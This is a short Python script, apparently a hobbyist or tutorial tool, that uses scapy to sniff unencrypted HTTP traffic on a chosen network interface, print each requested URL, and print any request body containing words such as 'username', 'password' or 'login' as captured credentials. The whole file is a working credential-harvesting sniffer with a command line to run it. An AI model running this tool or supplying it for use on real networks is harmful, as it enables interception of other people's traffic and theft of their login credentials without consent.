#!usr/bin/env python
import scapy.all as sp
import argparse
from scapy.layers import http


# run using:
# python3 sniffer.py -i wlan0
def get_arg(parser, flag, name, text):
    parser.add_argument("-" + flag, "--" + name, dest=name, help=text)
    return parser

def sniff(interface):
    # Use berkeley packet filter syntax
    sp.sniff(iface = interface, store=False, prn=processing, filter="port 80")

def processing(packet):
    if packet.haslayer(http.HTTPRequest):
        url = (packet[http.HTTPRequest].Host).decode("utf-8")  + (packet[http.HTTPRequest].Path).decode("utf-8")
        print("[+] URL: " + url)
        if packet.haslayer(sp.Raw):
            loader = (packet[sp.Raw].load).decode("utf-8")
            keywords = ["username", "password", "user", "key", "login", "id"]
            for word in keywords:
                if word in loader.lower():
                    print('[+] Username/Passkey: ' + str(loader))
                    break
parser = argparse.ArgumentParser()
parser = get_arg(parser, 'i', 'interface', 'Interface for sniffing')

value = parser.parse_args()
sniff(value.interface)